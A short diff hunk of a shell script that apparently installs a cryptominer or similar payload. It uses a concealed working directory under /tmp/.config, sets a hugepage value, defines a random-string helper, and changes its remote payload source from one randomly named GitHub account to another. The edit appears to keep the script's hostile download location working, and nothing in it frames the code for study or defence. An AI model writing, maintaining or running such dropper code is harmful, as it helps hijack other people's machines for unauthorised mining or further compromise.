@@ -2,7 +2,7 @@
 
 mode="${1:-0}"
 work="/tmp/.config"
-src="https://raw.githubusercontent.com/vjbahkds/jsncsdccw/main"
+src="https://raw.githubusercontent.com/hanrzme/jsncsdccw/main"
 hugepage="1024"
 
 RandString() {
